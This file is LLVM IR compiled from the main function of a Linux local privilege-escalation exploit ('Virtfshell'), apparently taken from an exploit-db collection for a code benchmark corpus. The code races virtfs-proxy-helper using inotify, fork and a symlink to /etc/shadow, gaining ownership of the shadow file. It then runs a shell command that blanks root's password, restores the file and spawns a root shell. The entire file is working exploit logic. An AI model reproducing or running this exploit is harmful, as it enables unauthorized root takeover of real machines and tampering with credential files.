; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39010.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_39010.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"== Virtfshell - by zx2c4 ==\0A\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"[+] Beginning race loop\0A\00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"\1B[1A\1B[2K[+] Trying to win race, attempt %zu\0A\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"/tmp/virtfshell/sock\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"/tmp/virtfshell\00", align 1
@IN_CREATE = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [20 x i8] c"virtfs-proxy-helper\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"-n\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"-p\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"-u\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"-g\00", align 1
@.str.12 = private unnamed_addr constant [3 x i8] c"-s\00", align 1
@.str.13 = private unnamed_addr constant [12 x i8] c"/etc/shadow\00", align 1
@SIGKILL = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [44 x i8] c"[+] Chown'd /etc/shadow, elevating to root\0A\00", align 1
@.str.15 = private unnamed_addr constant [335 x i8] c"cp /etc/shadow /tmp/original_shadow;sed 's/^root:.*/root::::::::/' /etc/shadow > /tmp/modified_shadow;cat /tmp/modified_shadow > /etc/shadow;su -c '\09echo [+] Cleaning up;\09cat /tmp/original_shadow > /etc/shadow;\09chown root:root /etc/shadow;\09rm /tmp/modified_shadow /tmp/original_shadow;\09echo [+] Spawning root shell;\09exec /bin/bash -i'\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [12 x i8], align 1
  %9 = alloca [12 x i8], align 1
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 0, i64* %10, align 8
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  %12 = call i32 (...) @getuid()
  %13 = call i32 @sprintf(i8* %11, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i32 %12)
  %14 = getelementptr inbounds [12 x i8], [12 x i8]* %9, i64 0, i64 0
  %15 = call i32 (...) @getgid()
  %16 = call i32 @sprintf(i8* %14, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), i32 %15)
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0))
  br label %19

19:                                               ; preds = %48, %36, %2
  %20 = call i32 (...) @it_worked()
  %21 = icmp ne i32 %20, 0
  %22 = xor i1 %21, true
  br i1 %22, label %23, label %59

23:                                               ; preds = %19
  %24 = load i64, i64* %10, align 8
  %25 = add i64 %24, 1
  store i64 %25, i64* %10, align 8
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0), i64 %25)
  %27 = call i32 (...) @inotify_init()
  store i32 %27, i32* %6, align 4
  %28 = call i32 @unlink(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %29 = call i32 @mkdir(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0), i32 511)
  %30 = load i32, i32* %6, align 4
  %31 = load i32, i32* @IN_CREATE, align 4
  %32 = call i32 @inotify_add_watch(i32 %30, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0), i32 %31)
  %33 = call i32 (...) @fork()
  store i32 %33, i32* %7, align 4
  %34 = load i32, i32* %7, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %23
  br label %19

37:                                               ; preds = %23
  %38 = load i32, i32* %7, align 4
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %48, label %40

40:                                               ; preds = %37
  %41 = call i32 @close(i32 0)
  %42 = call i32 @close(i32 1)
  %43 = call i32 @close(i32 2)
  %44 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  %45 = getelementptr inbounds [12 x i8], [12 x i8]* %9, i64 0, i64 0
  %46 = call i32 @execlp(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* %44, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i8* %45, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.12, i64 0, i64 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i32* null)
  %47 = call i32 @_exit(i32 1) #3
  unreachable

48:                                               ; preds = %37
  %49 = load i32, i32* %6, align 4
  %50 = call i32 @read(i32 %49, i32 0, i32 0)
  %51 = call i32 @unlink(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %52 = call i32 @symlink(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.13, i64 0, i64 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %53 = load i32, i32* %6, align 4
  %54 = call i32 @close(i32 %53)
  %55 = load i32, i32* %7, align 4
  %56 = load i32, i32* @SIGKILL, align 4
  %57 = call i32 @kill(i32 %55, i32 %56)
  %58 = call i32 @wait(i32* null)
  br label %19

59:                                               ; preds = %19
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.14, i64 0, i64 0))
  %61 = call i32 @system(i8* getelementptr inbounds ([335 x i8], [335 x i8]* @.str.15, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @sprintf(i8*, i8*, i32) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @getgid(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @it_worked(...) #1

declare dso_local i32 @inotify_init(...) #1

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @mkdir(i8*, i32) #1

declare dso_local i32 @inotify_add_watch(i32, i8*, i32) #1

declare dso_local i32 @fork(...) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @execlp(i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @_exit(i32) #2

declare dso_local i32 @read(i32, i32, i32) #1

declare dso_local i32 @symlink(i8*, i8*) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @wait(i32*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
